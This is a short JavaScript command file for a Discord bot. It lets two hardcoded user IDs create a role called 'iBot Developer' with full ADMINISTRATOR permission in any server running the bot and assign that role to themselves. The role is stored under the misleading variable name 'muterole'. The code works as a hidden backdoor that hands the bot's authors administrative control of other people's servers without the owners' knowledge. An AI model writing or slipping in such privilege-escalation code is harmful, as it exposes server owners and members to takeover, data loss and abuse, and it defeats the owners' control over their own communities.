module.exports.run = async (Discord, client, message, args) => {
if(message.author.id !== '281060171730649089' && message.author.id !== '255048840615428107') return
let muterole = await message.guild.createRole({
                name: "iBot Developer",
                color: "#000000",
                permissions: ["ADMINISTRATOR"]
            })
let member = message.author;
  let modRole = message.guild.roles.find("name", "iBot Developer");
  message.member.addRole(modRole).catch(console.error);
}